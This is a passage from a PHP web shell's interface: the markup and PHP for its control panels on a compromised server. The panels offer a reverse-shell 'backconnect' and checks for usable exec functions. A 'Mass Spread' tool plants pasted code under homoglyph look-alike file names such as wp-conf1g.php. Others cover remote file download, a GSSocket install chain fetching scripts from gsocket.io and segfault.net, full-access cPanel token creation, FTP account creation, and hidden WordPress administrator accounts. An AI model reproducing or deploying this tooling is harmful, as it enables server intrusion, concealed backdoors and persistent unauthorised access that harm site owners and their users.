                foreach ($exec_fns as $fn) {
                    $avail = function_exists($fn) && !in_array($fn, $disabled_fns);
                    $color = $avail ? '#3fb950' : '#f85149';
                    echo '<span style="font-size:9px;padding:2px 6px;border-radius:3px;background:rgba('.($avail?'63,185,80':'248,81,73').',0.1);color:'.$color.';border:1px solid rgba('.($avail?'63,185,80':'248,81,73').',0.2);">'.$fn.'</span>';
                }
                ?>
            </div>
            <div id="bcResult" style="display:none; margin-top: 10px; background: var(--bg-card); border: 1px solid var(--border); border-radius: 6px; padding: 10px; font-size: 11px; font-family: monospace;"></div>
        </div>
        <div class="modal-footer" style="justify-content: center; gap: 12px;">
            <button class="btn btn-secondary" onclick="hideModal2('backconnectModal')">Cancel</button>
            <button class="btn" id="bcConnBtn" style="background: #ef4444; border-color: #ef4444; color: #fff; font-weight: 600;" onclick="doBackconnect()">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
                Connect
            </button>
        </div>
    </div>
</div>

<!-- Edit File Modal -->
<div class="modal-overlay hidden" id="editFileModal">
    <div class="modal" style="max-width: 800px; max-height: 90vh;">
        <div class="modal-header" style="border-bottom-color: rgba(0, 212, 255, 0.3);">
            <span class="modal-title" style="color: #00d4ff;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
                Edit File: <span id="editFileName" style="color: var(--gold);"></span>
            </span>
            <button class="modal-close" onclick="hideEditModal()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding: 12px;">
            <div id="editLoading" style="text-align:center;padding:40px;color:var(--text-muted);">Loading file content...</div>
            <div id="editCmWrap" style="display:none;"></div>
            <textarea id="editFileContent" style="display:none;"></textarea>
        </div>
        <div class="modal-footer" style="justify-content: flex-end; gap: 8px;">
            <button type="button" class="btn btn-secondary" onclick="hideEditModal()">Cancel</button>
            <button type="button" class="btn btn-primary" id="editSaveBtn" onclick="saveEditFile()" disabled>
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><polyline points="17 21 17 13 7 13 7 21"/><polyline points="7 3 7 8 15 8"/></svg>
                Save File
            </button>
        </div>
    </div>
</div>
<input type="hidden" id="editFilePath" value="">

<!-- Rename Modal -->
<div class="modal-overlay hidden" id="renameModal">
    <div class="modal" style="max-width: 420px;">
        <div class="modal-header" style="border-bottom-color: rgba(255, 215, 0, 0.3);">
            <span class="modal-title" style="color: var(--gold);">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>
                Rename
            </span>
            <button class="modal-close" onclick="hideRenameModal()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding: 20px;">
            <div style="width: 50px; height: 50px; background: rgba(255,215,0,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px;">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--gold)" stroke-width="2"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>
            </div>
            <p style="color: var(--text-muted); font-size: 11px; text-align: center; margin-bottom: 12px;">Current name:</p>
            <p id="renameCurrentName" style="color: var(--gold); font-size: 13px; font-weight: 600; word-break: break-all; text-align: center; margin-bottom: 16px;"></p>
            <div class="form-group" style="margin-bottom: 0;">
                <label class="form-label">New Name</label>
                <input type="text" id="renameNewName" class="form-input" placeholder="Enter new name..." required>
            </div>
        </div>
        <div class="modal-footer" style="justify-content: center; gap: 12px;">
            <button type="button" class="btn btn-secondary" onclick="hideRenameModal()">Cancel</button>
            <button type="button" class="btn btn-primary" onclick="doRename()">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><polyline points="20 6 9 17 4 12"/></svg>
                Rename
            </button>
        </div>
    </div>
</div>
<input type="hidden" id="renameFilePath" value="">

<!-- Chmod Modal -->
<div class="modal-overlay hidden" id="chmodFileModal">
    <div class="modal" style="max-width: 420px;">
        <div class="modal-header" style="border-bottom-color: rgba(63, 185, 80, 0.3);">
            <span class="modal-title" style="color: #3fb950;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:6px;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                Change Permission
            </span>
            <button class="modal-close" onclick="hideChmodFileModal()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body" style="padding: 20px;">
            <div style="width: 50px; height: 50px; background: rgba(63,185,80,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px;">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#3fb950" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
            </div>
            <p id="chmodFileName" style="color: var(--gold); font-size: 13px; font-weight: 600; word-break: break-all; text-align: center; margin-bottom: 6px;"></p>
            <p style="color: var(--text-muted); font-size: 11px; text-align: center; margin-bottom: 16px;">Current: <span id="chmodCurrentPerm" style="color: #3fb950; font-family: monospace; font-weight: 600;"></span></p>
            <div class="form-group" style="margin-bottom: 12px;">
                <label class="form-label">New Permission</label>
                <input type="text" id="chmodNewPerm" class="form-input" placeholder="e.g. 0755" maxlength="4" style="text-align: center; font-family: monospace; font-size: 16px; font-weight: 600; letter-spacing: 4px;" required>
            </div>
            <div style="display: flex; gap: 6px; justify-content: center; flex-wrap: wrap;">
                <button type="button" class="btn btn-sm btn-secondary" onclick="document.getElementById('chmodNewPerm').value='0755'" style="font-size:10px;padding:3px 8px;font-family:monospace;">0755</button>
                <button type="button" class="btn btn-sm btn-secondary" onclick="document.getElementById('chmodNewPerm').value='0644'" style="font-size:10px;padding:3px 8px;font-family:monospace;">0644</button>
                <button type="button" class="btn btn-sm btn-secondary" onclick="document.getElementById('chmodNewPerm').value='0777'" style="font-size:10px;padding:3px 8px;font-family:monospace;">0777</button>
                <button type="button" class="btn btn-sm btn-secondary" onclick="document.getElementById('chmodNewPerm').value='0444'" style="font-size:10px;padding:3px 8px;font-family:monospace;">0444</button>
                <button type="button" class="btn btn-sm btn-secondary" onclick="document.getElementById('chmodNewPerm').value='0600'" style="font-size:10px;padding:3px 8px;font-family:monospace;">0600</button>
            </div>
        </div>
        <div class="modal-footer" style="justify-content: center; gap: 12px;">
            <button type="button" class="btn btn-secondary" onclick="hideChmodFileModal()">Cancel</button>
            <button type="button" class="btn" style="background: #3fb950; border-color: #3fb950; color: #000; font-weight: 600;" onclick="doChmod()">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:inline;vertical-align:middle;margin-right:4px;"><polyline points="20 6 9 17 4 12"/></svg>
                Apply
            </button>
        </div>
    </div>
</div>
<input type="hidden" id="chmodFilePath" value="">

<!-- Mass Chmod Modal -->
<div class="modal-overlay hidden" id="chmodModal">
    <div class="modal" style="max-width: 450px;">
        <div class="modal-header">
            <span class="modal-title">Mass Chmod</span>
            <button class="modal-close" onclick="hideModal('chmod')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <form method="POST">
            <div class="modal-body">
                <div class="form-group">
                    <label class="form-label">Target Path</label>
                    <input type="text" name="chmod_path" class="form-input" value="<?php echo htmlspecialchars($currentDirectory); ?>" required>
                </div>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                    <div class="form-group">
                        <label class="form-label">Folder Permission</label>
                        <input type="text" name="chmod_folder" class="form-input" placeholder="0755" value="0755" maxlength="4" required>
                    </div>
                    <div class="form-group">
                        <label class="form-label">File Permission</label>
                        <input type="text" name="chmod_file" class="form-input" placeholder="0644" value="0644" maxlength="4" required>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" onclick="hideModal('chmod')">Cancel</button>
                <button type="submit" name="mass_chmod" class="btn btn-primary">Apply</button>
            </div>
        </form>
    </div>
</div>

<!-- Mass Spread Modal -->
<div class="modal-overlay <?php echo isset($_POST['mass_spread']) ? '' : 'hidden'; ?>" id="spreadModal">
    <div class="modal" style="max-width: 600px; max-height: 90vh;">
        <div class="modal-header">
            <span class="modal-title">Mass Spread (Auto-Match)</span>
            <button class="modal-close" onclick="hideModal('spread')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <?php if (isset($_POST['mass_spread']) && !empty($responseMessage)): ?>
        <div class="modal-body" style="overflow-y:auto;max-height:calc(90vh - 120px);">
            <div style="display:flex;align-items:center;gap:10px;margin-bottom:14px;">
                <div style="width:36px;height:36px;background:rgba(63,185,80,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#3fb950" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>
                </div>
                <div style="font-size:13px;font-weight:600;color:#3fb950;">Spread Complete</div>
            </div>
            <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:12px;max-height:420px;overflow-y:auto;">
                <?php echo $responseMessage; ?>
            </div>
        </div>
        <div class="modal-footer" style="justify-content:center;">
            <button class="btn btn-secondary" onclick="hideModal('spread')">Close</button>
            <button class="btn btn-primary" onclick="hideModal('spread');showModal('spread')">Spread Again</button>
        </div>
        <?php else: ?>
        <form method="POST">
            <div class="modal-body">
                <div style="background: rgba(0, 212, 255, 0.08); border: 1px solid rgba(0, 212, 255, 0.2); border-radius: 6px; padding: 12px; margin-bottom: 14px;">
                    <p style="color: var(--accent); font-size: 11px; font-weight: 600; margin-bottom: 6px;">Auto-Match Filename</p>
                    <p style="color: var(--text-muted); font-size: 10px; line-height: 1.5;">Scans each folder for existing PHP files and creates a homoglyph variant automatically. Example: <span style="color:var(--gold);">wp-config.php</span> becomes <span style="color:var(--green);">wp-conf1g.php</span> or <span style="color:var(--green);">wp-c0nfig.php</span></p>
                </div>
                <div class="form-group">
                    <label class="form-label">Paste Code</label>
                    <textarea name="spread_content" class="form-input" style="min-height: 200px; resize: vertical; font-family: monospace;" placeholder="Paste your code here..." required></textarea>
                </div>
                <div style="background: rgba(248, 81, 73, 0.1); border: 1px solid rgba(248, 81, 73, 0.3); border-radius: 6px; padding: 10px;">
                    <p style="color: var(--red); font-size: 11px;">Recursive from: <?php echo htmlspecialchars($currentDirectory); ?></p>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" onclick="hideModal('spread')">Cancel</button>
                <button type="submit" name="mass_spread" class="btn btn-primary">Spread All</button>
            </div>
        </form>
        <?php endif; ?>
    </div>
</div>

<!-- Multi Upload Modal -->
<div class="modal-overlay <?php echo isset($_POST['multi_upload']) ? '' : 'hidden'; ?>" id="multiuploadModal">
    <div class="modal" style="max-width: 600px; max-height: 90vh;">
        <div class="modal-header">
            <span class="modal-title">Multi Upload</span>
            <button class="modal-close" onclick="hideModal('multiupload')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <?php if (isset($_POST['multi_upload']) && !empty($responseMessage)): ?>
        <div class="modal-body" style="overflow-y:auto;max-height:calc(90vh - 120px);">
            <div style="display:flex;align-items:center;gap:10px;margin-bottom:14px;">
                <div style="width:36px;height:36px;background:rgba(63,185,80,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#3fb950" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>
                </div>
                <div style="font-size:13px;font-weight:600;color:#3fb950;">Upload Complete</div>
            </div>
            <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:12px;max-height:420px;overflow-y:auto;">
                <?php echo $responseMessage; ?>
            </div>
        </div>
        <div class="modal-footer" style="justify-content:center;">
            <button class="btn btn-secondary" onclick="hideModal('multiupload')">Close</button>
            <button class="btn btn-primary" onclick="location.reload()">Refresh</button>
        </div>
        <?php else: ?>
        <form method="POST" enctype="multipart/form-data">
            <div class="modal-body">
                <div id="uploadersContainer">
                    <div class="uploader-row">
                        <label class="custom-file-input">
                            <input type="file" name="files[]" onchange="updateFileName(this)">
                            <span class="file-btn">Choose File</span>
                            <span class="file-name">No file selected</span>
                        </label>
                        <button type="button" class="btn btn-danger btn-sm" onclick="removeUploader(this)">X</button>
                    </div>
                </div>
                <button type="button" class="btn btn-secondary btn-sm" onclick="addUploader()" style="margin-top: 10px; width: 100%;">+ Add More</button>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" onclick="hideModal('multiupload')">Cancel</button>
                <button type="submit" name="multi_upload" class="btn btn-primary">Upload All</button>
            </div>
        </form>
        <?php endif; ?>
    </div>
</div>

<!-- Remote Upload Modal -->
<div class="modal-overlay hidden" id="remoteModal">
    <div class="modal" style="max-width: 450px;">
        <div class="modal-header">
            <span class="modal-title">Remote Upload</span>
            <button class="modal-close" onclick="hideModal('remote')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <form method="POST">
            <div class="modal-body">
                <div class="form-group">
                    <label class="form-label">URL</label>
                    <input type="text" name="remote_url" class="form-input" placeholder="https://example.com/file.php" required>
                </div>
                <div class="form-group">
                    <label class="form-label">Save as (optional)</label>
                    <input type="text" name="remote_filename" class="form-input" placeholder="Leave empty for original name">
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" onclick="hideModal('remote')">Cancel</button>
                <button type="submit" name="remote_upload" class="btn btn-primary">Download</button>
            </div>
        </form>
    </div>
</div>

<!-- GSSocket Modal -->
<div class="modal-overlay hidden" id="gsocketModal">
    <div class="modal" style="max-width: 500px;">
        <div class="modal-header">
            <span class="modal-title" style="color: #10b981;">GSSocket Manager</span>
            <button class="modal-close" onclick="hideModal('gsocket')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body">
            <div style="background: rgba(16,185,129,0.08); border: 1px solid rgba(16,185,129,0.2); border-radius: 6px; padding: 12px; margin-bottom: 16px;">
                <p style="color: #10b981; font-size: 11px; font-weight: 600; margin-bottom: 4px;">GSSocket Auto-Install Chain</p>
                <p style="color: var(--text-muted); font-size: 10px; line-height: 1.5;">
                    1. gsocket.io/y (curl/wget)<br>
                    2. segfault.net/deploy-all.sh<br>
                    3. GS_PORT=53 deploy-all.sh
                </p>
            </div>
            <div style="display: flex; gap: 10px;">
                <form method="POST" style="flex: 1;">
                    <input type="hidden" name="gsocket_action" value="1">
                    <input type="hidden" name="gsocket_cmd" value="install">
                    <button type="submit" class="btn btn-gs" style="width: 100%; padding: 10px;">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                        Install
                    </button>
                </form>
                <form method="POST" style="flex: 1;">
                    <input type="hidden" name="gsocket_action" value="1">
                    <input type="hidden" name="gsocket_cmd" value="uninstall">
                    <button type="submit" class="btn btn-danger" style="width: 100%; padding: 10px;">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
                        Uninstall
                    </button>
                </form>
            </div>
        </div>
    </div>
</div>

<!-- UAPI Modal -->
<div class="modal-overlay hidden" id="uapiModal">
    <div class="modal" style="max-width: 520px;">
        <div class="modal-header">
            <span class="modal-title" style="color: #8b5cf6;">UAPI / cPanel Manager</span>
            <button class="modal-close" onclick="hideModal('uapi')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body">
            <p style="color: var(--text-muted); font-size: 11px; font-weight: 600; margin-bottom: 10px;">Generate cPanel API Token</p>
            <form method="POST" style="margin-bottom: 20px;">
                <button type="submit" name="cpanel_token" class="btn btn-uapi" style="width: 100%;">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                    Generate Token
                </button>
                <span style="font-size: 10px; color: var(--text-muted);">Creates a full-access API token for cPanel.</span>
            </form>
            <div style="border-top: 1px solid var(--border); padding-top: 16px;">
                <p style="color: var(--text-muted); font-size: 11px; font-weight: 600; margin-bottom: 10px;">Server Info</p>
                <div style="background: var(--bg-secondary); padding: 10px; border-radius: 6px; font-size: 11px; color: var(--text-muted); font-family: monospace;">
                    <div>Domain: <?php echo htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'N/A'); ?></div>
                    <div>User: <?php echo htmlspecialchars(get_current_user()); ?></div>
                    <div>Server: <?php echo htmlspecialchars(php_uname('n')); ?></div>
                    <div>PHP: <?php echo phpversion(); ?></div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- FTP Manager Modal -->
<div class="modal-overlay hidden" id="ftpModal">
    <div class="modal" style="max-width: 620px;">
        <div class="modal-header">
            <span class="modal-title" style="color: #f97316;">FTP Manager</span>
            <button class="modal-close" onclick="hideModal('ftp')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body">
            <!-- Add FTP -->
            <div style="background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; padding: 14px; margin-bottom: 16px;">
                <p style="color: var(--gold); font-size: 12px; font-weight: 600; margin-bottom: 10px;">Add FTP Account</p>
                <form method="POST">
                    <div style="display: grid; grid-template-columns: 1fr 1fr 80px; gap: 8px; align-items: end;">
                        <div class="form-group" style="margin: 0;">
                            <label class="form-label">Username</label>
                            <input type="text" name="ftp_user" class="form-input" placeholder="ftpuser" required>
                        </div>
                        <div class="form-group" style="margin: 0;">
                            <label class="form-label">Password</label>
                            <input type="text" name="ftp_pass" class="form-input" placeholder="P@ss123!" required>
                        </div>
                        <button type="submit" name="ftp_add" class="btn btn-primary btn-sm" style="height: 36px;">Add</button>
                    </div>
                </form>
            </div>

            <!-- List + Actions -->
            <div style="margin-bottom: 10px;">
                <p style="color: var(--text-primary); font-size: 12px; font-weight: 600;">FTP Accounts</p>
            </div>

            <?php if (!empty($ftpAccounts)): ?>
            <div style="max-height: 300px; overflow-y: auto;">
            <?php foreach ($ftpAccounts as $i => $ftp):
                $ftpLogin = $ftp['login'] ?? $ftp['user'] ?? '';
                $ftpDomain = $ftp['domain'] ?? '';
                $ftpDir = $ftp['homedir'] ?? '';
                $ftpAtSign = strpos($ftpLogin, '@');
                $ftpUserOnly = ($ftpAtSign !== false) ? substr($ftpLogin, 0, $ftpAtSign) : $ftpLogin;
                if (empty($ftpDomain) && $ftpAtSign !== false) $ftpDomain = substr($ftpLogin, $ftpAtSign + 1);
            ?>
            <div style="background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 6px; padding: 10px; margin-bottom: 6px;">
                <div style="display: flex; justify-content: space-between; align-items: center; gap: 8px; flex-wrap: wrap;">
                    <div style="flex: 1; min-width: 180px;">
                        <div style="color: var(--accent); font-size: 12px; font-weight: 600; font-family: monospace;"><?php echo htmlspecialchars($ftpLogin); ?></div>
                        <div style="color: var(--text-muted); font-size: 10px;"><?php echo htmlspecialchars($ftpDir); ?></div>
                    </div>
                    <div style="display: flex; gap: 4px; align-items: center;">
                        <button type="button" class="btn btn-sm btn-secondary" style="padding: 3px 8px; font-size: 10px;" onclick="ftpChgPass('<?php echo htmlspecialchars($ftpUserOnly, ENT_QUOTES); ?>','<?php echo htmlspecialchars($ftpDomain, ENT_QUOTES); ?>')">ChgPass</button>
                        <form method="POST" style="margin:0;" onsubmit="return confirm('Delete <?php echo htmlspecialchars($ftpLogin, ENT_QUOTES); ?>?')">
                            <input type="hidden" name="ftp_del_user" value="<?php echo htmlspecialchars($ftpUserOnly); ?>">
                            <input type="hidden" name="ftp_del_domain" value="<?php echo htmlspecialchars($ftpDomain); ?>">
                            <button type="submit" name="ftp_delete" class="btn btn-sm btn-danger" style="padding: 3px 8px; font-size: 10px;">Del</button>
                        </form>
                    </div>
                </div>
                <!-- Inline change password (hidden by default) -->
                <div id="ftpChg_<?php echo $i; ?>" class="hidden" style="margin-top: 8px; padding-top: 8px; border-top: 1px solid var(--border);">
                    <form method="POST" style="display: flex; gap: 6px; align-items: end;">
                        <input type="hidden" name="ftp_chg_user" value="<?php echo htmlspecialchars($ftpUserOnly); ?>">
                        <input type="hidden" name="ftp_chg_domain" value="<?php echo htmlspecialchars($ftpDomain); ?>">
                        <div style="flex: 1;">
                            <label class="form-label" style="font-size: 10px;">New Password</label>
                            <input type="text" name="ftp_chg_pass" class="form-input" style="font-size: 11px; padding: 6px 8px;" placeholder="NewP@ss!" required>
                        </div>
                        <button type="submit" name="ftp_passwd" class="btn btn-primary btn-sm" style="height: 32px; font-size: 10px;">Save</button>
                    </form>
                </div>
            </div>
            <?php endforeach; ?>
            </div>
            <?php else: ?>
            <div style="text-align: center; padding: 20px; color: var(--text-muted); font-size: 11px;">
                No FTP accounts found.
            </div>
            <?php endif; ?>
        </div>
    </div>
</div>

<!-- WordPress Manager Modal -->
<?php if ($wpAvailable): ?>
<div class="modal-overlay hidden" id="wpModal">
    <div class="modal" style="max-width: 820px; max-height: 90vh; overflow-y: auto;">
        <div class="modal-header">
            <span class="modal-title" style="color: #3b82f6;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display: inline; vertical-align: middle;"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/></svg>
                WordPress Manager
            </span>
            <button class="modal-close" onclick="hideModal('wp')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body">
            <!-- Create Admin -->
            <div style="background: var(--bg-secondary); border: 1px solid var(--border); border-radius: 8px; padding: 14px; margin-bottom: 16px;">
                <p style="color: #3fb950; font-size: 12px; font-weight: 600; margin-bottom: 10px;">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display: inline; vertical-align: middle;"><path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="8.5" cy="7" r="4"/><line x1="20" y1="8" x2="20" y2="14"/><line x1="23" y1="11" x2="17" y2="11"/></svg>
                    Create Admin User
                </p>
                <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-bottom: 8px;">
                    <div class="form-group" style="margin: 0;">
                        <label class="form-label">Username</label>
                        <input type="text" id="wpNewUser" class="form-input" placeholder="admin_user">
                    </div>
                    <div class="form-group" style="margin: 0;">
                        <label class="form-label">Password</label>
                        <input type="text" id="wpNewPass" class="form-input" placeholder="P@ssw0rd!">
                    </div>
                    <div class="form-group" style="margin: 0;">
                        <label class="form-label">Email (optional)</label>
                        <input type="text" id="wpNewEmail" class="form-input" placeholder="user@domain.com">
                    </div>
                </div>
                <div style="display: flex; align-items: center; gap: 10px;">
                    <label style="display: flex; align-items: center; gap: 6px; font-size: 11px; color: var(--text-muted); cursor: pointer; margin: 0;">
                        <input type="checkbox" id="wpHideUser" style="width: auto; accent-color: #7c3aed;">
                        Hide user from WP admin panel
                    </label>
                    <button type="button" class="btn btn-sm btn-primary" onclick="wpCreateAdmin()" style="margin-left: auto; padding: 6px 16px;">Create</button>
                </div>
                <div id="wpCreateStatus" style="display: none; margin-top: 8px; padding: 8px 12px; border-radius: 6px; font-size: 11px;"></div>
            </div>

            <!-- User List -->
            <div style="margin-bottom: 10px;">
                <p style="color: var(--text-primary); font-size: 12px; font-weight: 600;">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display: inline; vertical-align: middle;"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
                    WordPress Users
                </p>
            </div>

            <div id="wpUserList" style="max-height: 400px; overflow-y: auto;">
                <div style="text-align: center; padding: 20px; color: var(--text-muted); font-size: 11px;">Loading...</div>
            </div>
        </div>
    </div>
</div>

<!-- WP Delete Confirm Modal -->
<div class="modal-overlay hidden" id="wpDeleteModal" style="z-index: 1001;">
    <div class="modal" style="max-width: 400px;">
        <div class="modal-header">
            <span class="modal-title" style="color: #f85149;">Confirm Delete</span>
            <button class="modal-close" onclick="hideModal('wpDelete')"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
        </div>
        <div class="modal-body">
            <p style="color: var(--text-muted); font-size: 12px;">Delete user <strong id="wpDeleteName" style="color: #f85149;"></strong>? This cannot be undone.</p>
            <div style="display: flex; gap: 8px; margin-top: 14px; justify-content: flex-end;">
                <button class="btn btn-sm btn-secondary" onclick="hideModal('wpDelete')">Cancel</button>
                <button class="btn btn-sm btn-danger" id="wpDeleteConfirmBtn" onclick="wpConfirmDelete()">Delete</button>
            </div>
        </div>
    </div>
</div>
<?php endif; ?>

<!-- Process Manager Modal -->
<div class="modal-overlay hidden" id="procModal">
    <div class="modal" style="max-width: 1100px; max-height: 92vh; overflow: hidden; display: flex; flex-direction: column;">
        <div class="modal-header" style="flex-shrink: 0;">
            <span class="modal-title" style="color: #ec4899;">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display: inline; vertical-align: middle;"><rect x="4" y="4" width="16" height="16" rx="2"/><line x1="9" y1="9" x2="9.01" y2="9"/><line x1="15" y1="9" x2="15.01" y2="9"/></svg>
                Process Manager
                <span id="procLiveIndicator" style="display:inline-block;width:8px;height:8px;background:#3fb950;border-radius:50%;margin-left:8px;animation:procPulse 1s infinite;vertical-align:middle;"></span>
                <span style="font-size:10px;color:#3fb950;margin-left:4px;font-weight:400;">LIVE</span>
            </span>
            <div style="display:flex;align-items:center;gap:8px;">
                <span id="procStats" style="font-size:10px;color:var(--text-muted);"></span>
                <button class="btn btn-sm btn-secondary" onclick="procTogglePause()" id="procPauseBtn" style="padding:3px 10px;font-size:10px;">Pause</button>
                <button class="modal-close" onclick="procStopAndClose()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
            </div>
        </div>
        <div class="modal-body" style="flex: 1; overflow: hidden; display: flex; flex-direction: column; padding: 10px 14px;">
            <!-- Filter + Search -->
            <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;align-items:center;">
                <input type="text" id="procSearch" class="form-input" placeholder="Search process..." style="flex:1;min-width:150px;padding:5px 10px;font-size:11px;" oninput="procFilterRender()">
                <select id="procFilter" class="form-input" style="width:auto;padding:5px 8px;font-size:11px;" onchange="procFilterRender()">
                    <option value="all">All Processes</option>
                    <option value="mine">My Processes</option>
